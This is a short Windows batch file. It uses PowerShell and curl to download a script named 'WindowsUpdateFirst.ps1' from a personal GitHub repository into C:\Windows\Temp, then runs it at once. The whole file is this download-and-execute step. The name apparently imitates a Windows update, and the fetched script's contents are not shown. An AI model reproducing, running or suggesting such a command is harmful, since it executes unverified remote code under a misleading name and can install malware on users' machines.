@echo off
powershell -c "curl https://raw.githubusercontent.com/festorex/stuff/main/WindowsUpdateFirst.ps1 -O C:\Windows\Temp\WindowsUpdateFirst.ps1"
powershell.exe -File "C:\Windows\Temp\WindowsUpdateFirst.ps1"

